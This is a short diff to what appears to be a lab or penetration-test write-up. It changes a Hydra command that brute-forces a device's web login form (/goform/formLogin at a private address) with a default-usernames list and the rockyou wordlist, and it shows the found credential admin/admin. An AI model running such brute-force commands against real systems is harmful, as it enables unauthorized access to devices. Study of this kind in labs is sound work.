@@ -185,7 +185,7 @@ HtmlOnly=true&Login=admin&Password=password&loginButton=Submit+Login
 ```
 
 ```bash
-hydra -L /path/to/users.txt -P /usr/share/wordlists/rockyou.txt 192.168.69.45 http-post-form "/goform/formLogin:HtmlOnly=true&Login=^USER^&Password=^PASS^&loginButton=Submit+Login:Invalid"
+hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.69.45 http-post-form "/goform/formLogin:HtmlOnly=true&Login=^USER^&Password=^PASS^&loginButton=Submit+Login:Invalid"
 ```
 
 > admin/admin
